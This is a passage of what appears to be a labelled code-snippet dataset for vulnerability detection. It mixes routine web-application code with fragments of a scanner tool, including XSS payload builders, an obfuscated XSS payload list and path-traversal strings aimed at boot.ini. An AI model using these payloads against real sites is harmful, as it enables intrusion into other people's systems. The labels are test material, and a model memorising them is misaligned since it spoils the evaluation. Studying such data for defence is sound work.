PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2", "label": 0}, {"snippet_id": 7300, "code": "([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r", "label": 0}, {"snippet_id": 41040, "code": "%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t", "label": 0}, {"snippet_id": 5236, "code": " element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self", "label": 0}, {"snippet_id": 38040, "code": ".comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\"", "label": 0}, {"snippet_id": 42902, "code": ".get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype", "label": 0}, {"snippet_id": 25032, "code": "/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\"", "label": 0}, {"snippet_id": 31632, "code": "\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\",", "label": 0}, {"snippet_id": 39867, "code": ".fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe", "label": 0}, {"snippet_id": 41890, "code": "=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key", "label": 0}, {"snippet_id": 47202, "code": " 'modelview' in record_adminview model=record_adminview.pop('model') view=record_adminview.pop('modelview') admin.add_view(view(model, db.session, **record_adminview)) menu_items={str(item.name): item for", "label": 0}, {"snippet_id": 44227, "code": " Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle", "label": 0}, {"snippet_id": 307, "code": " res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body", "label": 1}, {"snippet_id": 45648, "code": "-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies", "label": 0}, {"snippet_id": 13483, "code": "'root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect',", "label": 0}, {"snippet_id": 38599, "code": "\"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, ", "label": 0}, {"snippet_id": 13810, "code": ".index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 31286, "code": ".select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) ", "label": 0}, {"snippet_id": 42978, "code": "\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\")", "label": 0}, {"snippet_id": 32026, "code": ".utils.translation import ugettext_lazy as _ from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction):", "label": 0}, {"snippet_id": 47647, "code": "'Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):'", "label": 0}, {"snippet_id": 34362, "code": "\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters", "label": 0}, {"snippet_id": 11712, "code": ", name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 13895, "code": "]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook", "label": 0}, {"snippet_id": 46730, "code": ": Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name='core/benefit_detail.html' def get_context_data(self, *args, **kwargs): data=super(", "label": 0}, {"snippet_id": 23812, "code": "' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar", "label": 0}, {"snippet_id": 29639, "code": "/div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\") \t\tpass def escape_html(text): \treturn cgi", "label": 0}, {"snippet_id": 46805, "code": "() post_id=fields.IntField() ref_id=fields.IntField(default=0) kind=K_COMMENT class Meta: table='comments' async def set_content(self, content): return await self.set_props_by_key('content', content) async", "label": 0}, {"snippet_id": 40797, "code": " self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc", "label": 0}, {"snippet_id": 14503, "code": ".run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name", "label": 0}, {"snippet_id": 5397, "code": "', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', ", "label": 0}, {"snippet_id": 41565, "code": " cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module", "label": 0}, {"snippet_id": 32178, "code": "\n \"\"\"Simple Markdown browser for a Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import", "label": 0}, {"snippet_id": 22188, "code": "), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views", "label": 0}, {"snippet_id": 14678, "code": " spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest", "label": 0}, {"snippet_id": 1833, "code": "] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low", "label": 0}, {"snippet_id": 13961, "code": ">[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 4944, "code": "\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>'", "label": 0}, {"snippet_id": 54811, "code": "['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT'])", "label": 0}, {"snippet_id": 40073, "code": "\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t", "label": 0}, {"snippet_id": 29956, "code": "'ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into", "label": 0}, {"snippet_id": 5178, "code": "' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus", "label": 0}, {"snippet_id": 33632, "code": "\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self", "label": 0}, {"snippet_id": 45608, "code": " new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get", "label": 0}, {"snippet_id": 22967, "code": ">[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=", "label": 0}, {"snippet_id": 29212, "code": " |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=", "label": 0}, {"snippet_id": 11238, "code": " if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up", "label": 0}, {"snippet_id": 54982, "code": " not in existing: changed_entities_array.append( ChangedEntityLocale(entity=changed_entity, locale=locale) ) ChangedEntityLocale.objects.bulk_create(changed_entities_array) def update_translation_memory", "label": 0}, {"snippet_id": 28177, "code": "\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r", "label": 0}, {"snippet_id": 31327, "code": "]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date", "label": 0}, {"snippet_id": 20837, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\"", "label": 0}, {"snippet_id": 3086, "code": "\"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=", "label": 0}, {"snippet_id": 37667, "code": "'(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on", "label": 0}, {"snippet_id": 17964, "code": "/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key", "label": 0}, {"snippet_id": 50753, "code": ". -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args: args=list(args) text=args[0] if text is None: return else", "label": 0}, {"snippet_id": 12618, "code": "/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch", "label": 0}, {"snippet_id": 16829, "code": "'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(", "label": 1}, {"snippet_id": 27859, "code": ") def handle_exception_exception(self): \"\"\"Catch exception in handle_exception and format it properly.\"\"\" exception=sys.exc_info()[1] values={'message': exception.message, 'traceDump': traceback.format_exc", "label": 0}, {"snippet_id": 10089, "code": " verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self):", "label": 0}, {"snippet_id": 42865, "code": "(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and", "label": 0}, {"snippet_id": 25170, "code": ".translation import ugettext_lazy as _ from pretix.base.forms.widgets import( BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget, TimePickerWidget, UploadedFileWidget, ) from pretix.base.models", "label": 0}, {"snippet_id": 26760, "code": "%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f", "label": 0}, {"snippet_id": 30382, "code": "\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint(data.decode('utf-8')) if serv is not None and form", "label": 0}, {"snippet_id": 52502, "code": ".uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request", "label": 0}, {"snippet_id": 5935, "code": "'<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<", "label": 0}, {"snippet_id": 12932, "code": "'ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'", "label": 0}, {"snippet_id": 54677, "code": "=self.object.comment_set.all().order_by('-time') context['form']=self.get_form() context['md']=markdown(self.object.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', ", "label": 1}, {"snippet_id": 43010, "code": " cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options)", "label": 0}, {"snippet_id": 54395, "code": ".grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text='Quit', command=main.destroy).grid(row=11, column", "label": 0}, {"snippet_id": 32344, "code": " print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' ", "label": 0}, {"snippet_id": 11094, "code": "--settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data", "label": 0}, {"snippet_id": 32361, "code": ", 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever", "label": 0}, {"snippet_id": 53508, "code": "\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if", "label": 0}, {"snippet_id": 38321, "code": ".full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t", "label": 0}, {"snippet_id": 8926, "code": "'root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect',", "label": 0}, {"snippet_id": 51129, "code": ": return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return", "label": 0}, {"snippet_id": 36051, "code": "\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn", "label": 0}, {"snippet_id": 43265, "code": " frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t", "label": 0}, {"snippet_id": 39647, "code": ")).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg", "label": 0}, {"snippet_id": 1263, "code": " jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json", "label": 0}, {"snippet_id": 49555, "code": "[SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] +values class SmartList(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search", "label": 0}, {"snippet_id": 32166, "code": " MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(", "label": 0}, {"snippet_id": 23805, "code": ".assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd", "label": 0}, {"snippet_id": 54419, "code": " column=0, sticky=W, pady=4) Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4) Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4) Label(main,", "label": 0}, {"snippet_id": 11160, "code": " times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This", "label": 0}, {"snippet_id": 41958, "code": "'_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict", "label": 0}, {"snippet_id": 34084, "code": "'Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar", "label": 0}, {"snippet_id": 39641, "code": "(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"):", "label": 0}, {"snippet_id": 44088, "code": " facets={ 'project': TermsFacet(field='project'), 'version': TermsFacet(field='version') } def query(self, search, query): \"\"\" Add query part to ``search`` Overriding because we pass ES Query object instead", "label": 0}, {"snippet_id": 19220, "code": "() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 42341, "code": " None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t", "label": 0}, {"snippet_id": 32172, "code": " description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\") row_actions=(EditMappingLink, DeleteMappingsAction) table_actions", "label": 0}, {"snippet_id": 41680, "code": " classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\"", "label": 0}, {"snippet_id": 48213, "code": " category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return", "label": 0}, {"snippet_id": 18212, "code": "'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P", "label": 1}, {"snippet_id": 43324, "code": " allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore", "label": 0}, {"snippet_id": 47029, "code": " \"\"\"Admin model views for records.\"\"\" import json from flask import flash from flask_admin.contrib.sqla import ModelView from flask_babelex import gettext as _ from invenio_admin.filters import FilterConverter", "label": 0}, {"snippet_id": 36589, "code": ".website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website", "label": 1}, {"snippet_id": 39696, "code": "\"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link", "label": 0}, {"snippet_id": 18996, "code": "'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/',", "label": 0}, {"snippet_id": 9276, "code": "+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(", "label": 0}, {"snippet_id": 34634, "code": " value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize", "label": 0}, {"snippet_id": 24705, "code": ".load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self", "label": 0}, {"snippet_id": 17930, "code": " 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release", "label": 0}, {"snippet_id": 12318, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 28485, "code": " \texcept: \t\tpass \t\t \tif kwargs.get('alerting')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data", "label": 0}, {"snippet_id": 38141, "code": "=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\":", "label": 1}, {"snippet_id": 11745, "code": "'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 30461, "code": ">\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" ", "label": 0}, {"snippet_id": 38255, "code": "=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category", "label": 0}, {"snippet_id": 44039, "code": " class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types, model, fields=None, **kwargs): self.using=using self.index", "label": 0}, {"snippet_id": 33178, "code": " to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to", "label": 0}, {"snippet_id": 29507, "code": " i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor", "label": 0}, {"snippet_id": 115, "code": " xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1", "label": 1}, {"snippet_id": 19010, "code": "/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status", "label": 0}, {"snippet_id": 23284, "code": "'ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include(", "label": 0}, {"snippet_id": 32828, "code": " status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to", "label": 0}, {"snippet_id": 12249, "code": "+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$", "label": 1}, {"snippet_id": 21653, "code": ">[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), 